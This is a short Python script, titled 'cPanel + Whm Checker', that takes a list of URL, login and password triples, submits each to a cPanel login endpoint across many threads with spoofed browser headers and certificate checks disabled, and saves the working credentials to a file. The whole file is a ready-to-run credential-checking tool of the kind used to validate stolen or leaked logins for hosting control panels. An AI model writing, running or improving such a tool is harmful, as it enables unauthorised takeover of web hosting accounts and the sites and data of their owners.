import sys, requests, re, datetime
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import Style
from colorama import init
init(autoreset=True)
fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT

print("cPanel + Whm Checker".format(fg, fg, fg, fr, fg))

def check(txt):
    url = txt.split('|')[0]
    login = txt.split('|')[1]
    password = txt.split('|')[2]
    headers = {
      'Accept': '*/*',
      'Accept-Language': 'en-US,en;q=0.9',
      'Connection': 'keep-alive',
      'Origin': url,
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
      'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"'}
    params = {'login_only': '1'}
    data = {'user':login, 
     'pass':password}
    try:
        try:
            response = requests.post(('{}/login/'.format(url)), params=params, headers=headers, data=data, timeout=5, verify=False).json()
            if response['status'] == 1:
                print('Valid: URL: {} | Login: {} | Password: {} \n'.format(url, login, password))
                with open('good.txt', 'a') as f:
                    print(url + ' --> {}[Success]'.format(fg))
                    f.write('{}|{}|{} \n'.format(url, login, password))
            else:
                print('Invalid: URL: {} | Login: {} | Password: {} \n'.format(url, login, password))
                print(url + ' --> {}[Failed]'.format(fr))
        except:
            print(url + ' --> {}[Failed]'.format(fr))

    except requests.Timeout as err:
        try:
            print(url + ' --> {}[Failed]'.format(fr))
        finally:
            err = None
            del err


def Main():
    file = input('Enter Your List : ')
    accounts_list = open(file, 'r').read().splitlines()
    thread = int(input('Enter Your Threads : '))
    mp = Pool(thread)
    mp.map(check, accounts_list)
    mp.close()
    mp.join()


Main()
